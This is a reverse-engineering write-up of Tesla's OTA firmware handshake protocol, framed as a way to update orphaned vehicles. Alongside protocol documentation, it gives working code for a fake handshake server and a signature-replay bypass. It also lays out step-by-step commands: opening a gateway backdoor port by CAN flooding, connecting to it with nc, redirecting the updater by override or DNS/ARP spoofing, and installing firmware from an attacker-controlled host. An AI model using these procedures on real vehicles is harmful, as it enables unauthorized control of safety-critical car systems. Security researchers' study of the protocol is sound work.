# Tesla OTA Handshake Protocol Specification

## Document Overview

This document provides a comprehensive reverse-engineering analysis of Tesla's OTA (Over-The-Air) update system, focusing on the handshake protocol that enables firmware installation. The goal is to enable creation of a fake handshake server for offline firmware installation on orphaned vehicles.

**Primary Binaries Analyzed:**
- `/bin/sx-updater` - Main updater daemon (static x86-64 ELF)
- `/usr/bin/updater-envoy` - Go binary handling HTTP/signatures
- `/usr/bin/updaterctl` - Shell script client for updater endpoints

---

## 1. Architecture Overview

### Component Hierarchy

```
                    ┌─────────────────────────────────────┐
                    │      Tesla Mothership               │
                    │   firmware.vn.teslamotors.com:4567  │
                    └─────────────────┬───────────────────┘
                                      │ (Internet)
                                      ▼
┌─────────────────────────────────────────────────────────────┐
│                        MCU/ICE Unit                         │
│  ┌─────────────────┐    ┌──────────────────┐               │
│  │   sx-updater    │◄──►│  updater-envoy   │               │
│  │   (C binary)    │    │   (Go binary)    │               │
│  │   Port 20564    │    │    Port 6789     │               │
│  └────────┬────────┘    └────────┬─────────┘               │
│           │                       │                         │
│           ▼                       ▼                         │
│  ┌─────────────────────────────────────────────┐           │
│  │            Local HTTP Endpoints              │           │
│  │  /handshake  /sigres  /gostaged  /install   │           │
│  └─────────────────────────────────────────────┘           │
└─────────────────────────────────────────────────────────────┘
                    │
                    ▼ (Internal Network 192.168.90.x)
┌─────────────────────────────────────────────────────────────┐
│                    Gateway ECU                              │
│                  192.168.90.102                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  Port 3500   │  │  Port 25956  │  │  Port 20564  │      │
│  │   UDPAPI     │  │   Updater    │  │   MCU API    │      │
│  │  (config)    │  │   (exploit)  │  │              │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└─────────────────────────────────────────────────────────────┘
```

### Port Assignments

| Port | Protocol | Service | Description |
|------|----------|---------|-------------|
| 20564 | HTTP | sx-updater (MCU) | Local updater control interface |
| 28496 | HTTP | sx-updater (APE) | Autopilot updater interface |
| 6789 | HTTP | updater-envoy | HTTP/signature handling |
| 4567 | HTTP | Mothership | Tesla's firmware server |
| 3500 | UDP | UDPAPI | Gateway configuration |
| 25956 | TCP | Updater shell | Opened via CAN exploit |

---

## 2. Handshake Protocol

### 2.1 Request Flow

```
Vehicle (sx-updater)                    Mothership (firmware.vn.teslamotors.com:4567)
        │                                              │
        │  POST /vehicles/{VIN}/handshake              │
        │  Content-Type: application/x-www-form-urlencoded
        │──────────────────────────────────────────────►│
        │                                              │
        │  Body:                                       │
        │  vehicle[gtw_hwid]=<hwid>                    │
        │  &vehicle[package_signature]=<base64_sig>   │
        │  &vehicle[das_a_signature]=<base64_sig>     │
        │  &vehicle[das_b_signature]=<base64_sig>     │
        │  &vehicle[map_signature]=<base64_sig>       │
        │  &vehicle[map_country]=<code>               │
        │  &vehicle[map_region]=<region>              │
        │  &vehicle[vehicle_hardware_configuration_string]=<vhcs>
        │                                              │
        │◄──────────────────────────────────────────────│
        │                                              │
        │  Response: JSON with download URLs           │
        │  and signature resolution data               │
```

### 2.2 Handshake Request Parameters

#### Required Fields

| Parameter | Description | Example |
|-----------|-------------|---------|
| `vehicle[package_signature]` | Base64 NaCl signature of current package | `vuVal+WBQE3lLzad...` |
| `vehicle[gtw_hwid]` | Gateway hardware ID | Integer |
| `vehicle[vehicle_hardware_configuration_string]` | VHCS string | Platform-specific |

#### Optional Fields

| Parameter | Description |
|-----------|-------------|
| `vehicle[das_a_signature]` | Autopilot bank A signature |
| `vehicle[das_b_signature]` | Autopilot bank B signature |
| `vehicle[das_a_breakout_signature]` | Breakout overlay signature (bank A) |
| `vehicle[das_b_breakout_signature]` | Breakout overlay signature (bank B) |
| `vehicle[map_signature]` | Maps signature |
| `vehicle[map_country]` | Map country code |
| `vehicle[map_region]` | Map region identifier |
| `vehicle[games_signatures][{name}.ssq]` | Games signatures |

### 2.3 Handshake Response Format

The mothership responds with JSON containing firmware metadata:

```json
{
  "firmwareDate": "2022-08-27",
  "firmwareVersion": "2022.24.6.mcu2",
  "signature": "vuVal+WBQE3lLzadYgyaK5fOvejamPW8PqBHTQtPCkE4vLMVQg/8yvGrWbfCvzzTUoc0QK1lrDmJgSR9e/0RCQ==",
  "md5": "94d074c49617057376b0a61b8444e553",
  "secVersion": "15",
  "downloadUrl": "https://firmware.vn.teslamotors.com/packages/...",
  "productRelease": "develop-2022.24.6-212-40a0d11b18",
  "apeSig": "S82RP+Cb6UDRvz1latdI4l0Ns5rBKETXoGqQKMkM4TT...",
  "apeSig25": "g3B2i44mNDCoySrq1nm4yO3gNW9L5PxV7P8XDCxdog...",
  "apeSig3": "7x0HIRSeb623+CssO5xpl3cc5x7ZOxhC1Ftn1orGIIA...",
  "ssq_download_url": "https://...",
  "ssq_download_file_md5": "...",
  "ssq_download_sig": "...",
  "ssq_download_num_bytes": 1234567890,
  "url_valid_until_full": 2000000000
}
```

### 2.4 Internal Handshake Endpoints

**sx-updater** provides local endpoints on port 20564:

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/handshake` | POST | Trigger handshake with mothership |
| `/{VIN}/handshake` | POST | VIN-specific handshake |
| `/set_handshake` | POST | Manually set handshake server |
| `/override_handshake` | GET | Override with JSON parameters |

**Override Handshake Usage:**
```
GET /override_handshake?<urlencoded JSON string of handshake key/value pairs>
```

---

## 3. Signature Resolution (SigRes)

### 3.1 Purpose

Signature Resolution allows the updater to verify firmware packages against known-good signatures and retrieve download URLs for firmware that matches.

### 3.2 SigRes Endpoint

```
GET /packages/signature?signature=<base64_signature>
```

**Response:**
```json
{
  "signature": "vuVal+WBQE3lLzadYgyaK5...",
  "md5": "94d074c49617057376b0a61b8444e553",
  "downloadUrl": "https://...",
  "secVersion": "15",
  "firmwareVersion": "2022.24.6.mcu2"
}
```

### 3.3 Internal SigRes Commands

Via `updaterctl` or direct HTTP:

```bash
# Query signature resolution
curl "http://localhost:20564/sigres?<base64_sig>%20sync"

# With crypto verification
curl "http://localhost:20564/sigres?<base64_sig>%20check_crypto"

# Secondary package sigres
curl "http://localhost:20564/sigres?<base64_sig>%20sync%20secondary=apweights"
```

**SigRes URL Patterns in sx-updater:**
```
/sigres?%s%%20sync
/sigres?%s%%20%s%%20sync
/sigres?%s%%20check_crypto
/sigres?%s%%20sync%%20secondary=apweights
```

---

## 4. Signature Format & Verification

### 4.1 NaCl Signatures

Tesla uses NaCl (Networking and Cryptography library) for signature verification. The key file referenced in the code: `nacl-verify.c`

**Signature Properties:**
- Base64-encoded
- 64 bytes decoded (512 bits)
- Ed25519 algorithm

### 4.2 Verification Flow

```c
// From strings analysis:
verify_nacl_signature%s package=%s offset=%ld size=%ld
verify_nacl_signature%s result=%d elapsed=%fs %s

// Signature validation:
base64_signature_has_valid_format status=yes line=%d signature=%s
base64_signature_has_valid_format status=not_even_close line=%d length=%zu
```

### 4.3 Public Keys

The updater uses two sets of keys:

| Key Type | Variable | Purpose |
|----------|----------|---------|
| `prod_pubkey` | Production | Normal firmware verification |
| `dev_pubkey` | Development | Developer-signed packages |

**Key location strings:**
```
signature %s path=%s size=%lu dev_pubkey=%s
signature %s path=%s size=%lu prod_pubkey=%s
```

### 4.4 Signature Storage

Signatures are cached in the sigres store:
- `/run/updater/` - Runtime state
- `sigres_store` - Cached signature resolutions
- `%s/%s-signature-cache` - Per-package signature cache
- `%s/signature-deploy` - Deployed signature location

---

## 5. OTA Update Workflow

### 5.1 State Machine

The update process follows a state machine with these phases:

```
Initial → Idle → Staging → Validating → Staged → Gostaging → Checking → Termination → Terminate
```

**State transitions from strings:**
```
Initial
Idle
Staging
Validating
Staged
Gostaging
Checking
Termination
Terminate
reporting
```

### 5.2 Complete Update Sequence

```
1. HANDSHAKE
   │ POST /vehicles/{VIN}/handshake
   │ Receive: download URL, signature, MD5
   ▼
2. SIGNATURE RESOLUTION
   │ GET /packages/signature?signature=...
   │ Verify signature validity
   ▼
3. DOWNLOAD
   │ HTTP GET firmware file (.ice, .mcu, .mcu2)
   │ Supports Range requests for resume
   │ Verify MD5 during download
   ▼
4. STAGE (VALIDATE)
   │ Mount squashfs package
   │ Verify NaCl signature
   │ Check dm-verity integrity
   ▼
5. GOSTAGED
   │ Request gostaged status
   │ /gostaged?status
   ▼
6. INSTALL
   │ POST /install?<params>
   │ Copy files to offline bank
   │ Update boot environment
   ▼
7. BANK SWAP
   │ swap-map-banks / swap boot banks
   │ Update bootloader pointers
   ▼
8. REBOOT
   │ /sbin/kexec-into or reboot
   │ Boot into new firmware
```

### 5.3 Key Commands

**Via updaterctl:**
```bash
updaterctl status          # Get current status
updaterctl gostaged        # Request gostage
updaterctl reset           # Reset updater state
updaterctl signature-install  # Install by signature
updaterctl watch           # Watch update progress
```

**Via HTTP:**
```bash
curl "http://localhost:20564/status"
curl "http://localhost:20564/gostaged?status"
curl "http://localhost:20564/install?<params>"
curl "http://localhost:20564/reset"
```

---

## 6. Package Format

### 6.1 File Types

| Extension | Description | Format |
|-----------|-------------|--------|
| `.ice` | Infotainment/main firmware | Squashfs, lz4 |
| `.mcu` | MCU1 firmware | Squashfs |
| `.mcu2` | MCU2 firmware | Squashfs, lz4 |
| `.mcu25` | MCU2.5 firmware | Squashfs |
| `.mcu3` | MCU3 firmware | Squashfs |
| `.ape2` | Autopilot 2.x | - |

### 6.2 Package Structure

ICE/MCU packages are **Squashfs filesystems**:
```
$ file 2025.26.8.ice
Squashfs filesystem, little endian, version 4.0, lz4 compressed,
2206369806 bytes, 28512 inodes, blocksize: 131072 bytes
```

### 6.3 Signature Location

The NaCl signature is embedded at a specific offset in the package:
```
verify_nacl_signature%s package=%s offset=%ld size=%ld
```

The signature is 64 bytes of Ed25519 data, typically at the end of the file or at a fixed header offset.

---

## 7. Fake Handshake Server Implementation

### 7.1 Required Endpoints

```javascript
// Minimum endpoints for fake server:

// 1. Signature lookup
GET /packages/signature?signature=<base64>

// 2. Handshake (vehicle-specific)
POST /vehicles/:vin/handshake

// 3. Firmware file serving (with Range support)
GET /:filename.ice
GET /:filename.mcu2
// etc.

// 4. Status sink
ALL /status

// 5. Job status (optional)
GET /jobs/:id/statuses
```

### 7.2 Implementation Guide

**Reference: `/firmware/gtw-backdoor/Open port/handshake/server.js`**

```javascript
const express = require("express");
const app = express();
const PORT = 8080;

// Load signature database
const signatures = require("./signature.json");

// Body parsing
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// Signature lookup
app.get("/packages/signature", (req, res) => {
  const sig = req.query.signature?.trim();
  if (!sig) return res.status(400).json({ error: "missing ?signature=" });
  
  const found = signatures.find(x => x.signature === sig);
  if (!found) return res.status(404).json({ error: "signature not found" });
  
  return res.json(found);
});

// Handshake endpoint
app.post("/vehicles/:vin/handshake", (req, res) => {
  const vin = req.params.vin;
  const sig = req.body?.vehicle?.package_signature;
  
  const found = signatures.find(x => x.signature === sig);
  if (!found) return res.status(404).json({ error: "signature not found" });
  
  return res.json(found);
});

// Firmware file serving with Range support
app.get("/:name", (req, res) => {
  // Implement resumable file download
  // Support Range: bytes=start-end
  // Return 206 Partial Content for ranges
});

app.listen(PORT, "0.0.0.0");
```

### 7.3 Signature Database Format

**File: `signatures.json`**

```json
[
  {
    "firmwareDate": "2022-08-27",
    "firmwareVersion": "2022.24.6.mcu2",
    "signature": "vuVal+WBQE3lLzadYgyaK5fOvejamPW8PqBHTQtPCkE4vLMVQg/8yvGrWbfCvzzTUoc0QK1lrDmJgSR9e/0RCQ==",
    "md5": "94d074c49617057376b0a61b8444e553",
    "secVersion": "15",
    "downloadUrl": "http://192.168.90.100:8080/2022.24.6.mcu2",
    "productRelease": "develop-2022.24.6-212-40a0d11b18",
    "apeSig": "...",
    "apeSig25": "...",
    "apeSig3": "..."
  }
]
```

**Available signatures:** ~481 entries in reference database

### 7.4 Redirecting the Updater

#### Method 1: set_handshake (Port 25956)

After opening port 25956 via CAN exploit:
```bash
nc 192.168.90.102 25956
> set_handshake 192.168.90.100 8080
```

#### Method 2: override_handshake

```bash
curl "http://localhost:20564/override_handshake?$(urlencode '{"firmware_download_url":"http://192.168.90.100:8080/2022.24.6.mcu2"}')"
```

#### Method 3: DNS Spoofing

Redirect `firmware.vn.teslamotors.com` to your server via:
- `/etc/hosts` modification
- DNS server configuration
- ARP spoofing (on same network)

---

## 8. Security Analysis

### 8.1 Signature Verification Bypass

The signature verification can be bypassed using **signature replay**:

1. Collect valid signatures from real Tesla firmware
2. Store in signature database
3. Serve matching signature when queried
4. Vehicle accepts firmware as legitimate

**Critical insight:** Tesla's verification checks if the signature is *valid for the package*, not if it's *fresh*. Pre-collected signatures remain valid indefinitely.

### 8.2 Attack Surfaces

| Attack | Vector | Difficulty |
|--------|--------|------------|
| Signature Replay | Signature database | Easy |
| Handshake Override | Port 25956 exploit | Medium |
| DNS Redirect | Network control | Easy |
| Development Key | Dev-signed package | Hard |

### 8.3 Verification Functions

From binary analysis:
```
verify_nacl_signature - Main signature check
verify_signature_in_chunks_callback - Chunked verification
dmverify_package - dm-verity integrity check
mount_package status=info action=sig_verify_before_mount
```

### 8.4 Limitations

- **dm-verity:** Filesystem integrity is verified via dm-verity
- **Secure boot:** Boot chain verification on newer hardware
- **Certificate freshness:** Some newer versions check signature age
- **Rollback protection:** Security version checks prevent downgrade

---

## 9. Practical Usage - Orphaned Car Scenario

### 9.1 Prerequisites

1. **CAN bus access** - PCAN adapter + OBD-II connection
2. **Ethernet access** - Connect to 192.168.90.x network
3. **Fake handshake server** - Running on 192.168.90.100:8080
4. **Signature database** - Contains target firmware signature
5. **Firmware file** - Valid Tesla .ice/.mcu2 package

### 9.2 Step-by-Step Process

```bash
# 1. Set up network
sudo ip addr add 192.168.90.100/24 dev eth0

# 2. Start handshake server
cd /path/to/handshake
npm install
PORT=8080 node server.js

# 3. Open port 25956 (CAN flooding)
python3 openportlanpluscan.py

# 4. Wait for port, then connect
nc 192.168.90.102 25956

# 5. Set handshake server
> set_handshake 192.168.90.100 8080

# 6. Trigger installation
> install http://192.168.90.100:8080/2022.24.6.mcu2

# OR via HTTP
curl "http://192.168.90.102:20564/gostaged?status=ok"
```

### 9.3 Monitoring

```bash
# Watch updater log
tail -f /var/log/updater.log

# Check status
curl http://192.168.90.102:20564/status
```

---

## 10. Related Documentation

| Document | Path | Description |
|----------|------|-------------|
| CAN Flood Exploit | `/research/02-gateway-can-flood-exploit.md` | Port 25956 opening procedure |
| Hermes Research | `/research/tesla-hermes-research.md` | Vehicle-cloud communication |
| Reference Server | `/firmware/gtw-backdoor/Open port/handshake/server.js` | Working implementation |
| Signatures DB | `/firmware/gtw-backdoor/Open port/signatures.json` | 481 firmware signatures |

---

## Appendix A: String Evidence

### Handshake-Related Strings
```
handle_handshake
check_handshake
set_handshake status=ok
override_handshake status=ok
remote_handshake
do_handshake
handshake updated
Handshake URL = http://%s:%s%s
Handshake URL = http://%s:%s%s/%%s/handshake
handshake-response
%s/%s/handshake
```

### Signature-Related Strings
```
signature=%s sig=%s
signature status=error
signature status=starting
Signature Verified.
verify_nacl_signature%s result=%d
base64_signature_has_valid_format status=yes
{"signature":"%s"}
{"signature":"%s","cache_signature":"%s"}
/packages/signature
```

### Download-Related Strings
```
firmware_download_url
ssq_download_url
ssq_download_file_md5
ssq_download_sig
ssq_download_num_bytes
download_override_url
download status=%s
wait_for_complete_download
DOWNLOAD_COMPLETE
DOWNLOAD_FAILURE
```

---

## Appendix B: Network Topology

```
                     [Your PC]
                  192.168.90.100
                        │
     ┌──────────────────┼──────────────────┐
     │                  │                   │
     │    Ethernet      │      CAN Bus      │
     │                  │                   │
     ▼                  │                   ▼
┌────────────┐          │          ┌────────────┐
│   MCU/ICE  │          │          │  Gateway   │
│  (updater) │◄─────────┼─────────►│   (ECU)    │
│   :20564   │          │          │  :3500     │
│   :6789    │          │          │  :25956    │
└────────────┘          │          └────────────┘
     │                  │                   │
     └──────────────────┴───────────────────┘
                        │
                    [CAN Bus]
                        │
              ┌─────────┴─────────┐
              │     Other ECUs    │
              │  (APE, Bodywork)  │
              └───────────────────┘
```

---

*Document created: 2026-02-02*
*Based on reverse engineering of sx-updater, updater-envoy, and related Tesla OTA components*
